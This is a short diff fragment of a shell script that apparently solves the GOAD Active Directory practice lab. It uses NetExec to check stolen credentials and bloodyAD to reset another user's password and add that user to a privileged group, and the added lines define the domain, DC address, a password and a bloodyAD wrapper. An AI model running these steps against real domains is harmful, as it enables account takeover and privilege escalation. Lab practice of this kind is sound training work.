@@ -479,3 +479,14 @@ nxc smb "$DC" -u joffrey.baratheon -p '1killerlion'        # [+]
 bad -u joffrey.baratheon -p '1killerlion' set password tyron.lannister 'NewPass123!'
 nxc smb "$DC" -u tyron.lannister -p 'NewPass123!'          # [+]
 bad -u tyron.lannister -p 'NewPass123!' add groupMember DRAGONSTONE tyron.lannister
+
+
+export PATH="$PATH:/root/.local/bin"
+
+D=sevenkingdoms.local
+
+DC=192.168.88.10
+
+P='powerkingftw135'
+
+bad(){ bloodyAD --host kingslanding.sevenkingdoms.local -d "$D" --dc-ip "$DC" "$@"; }
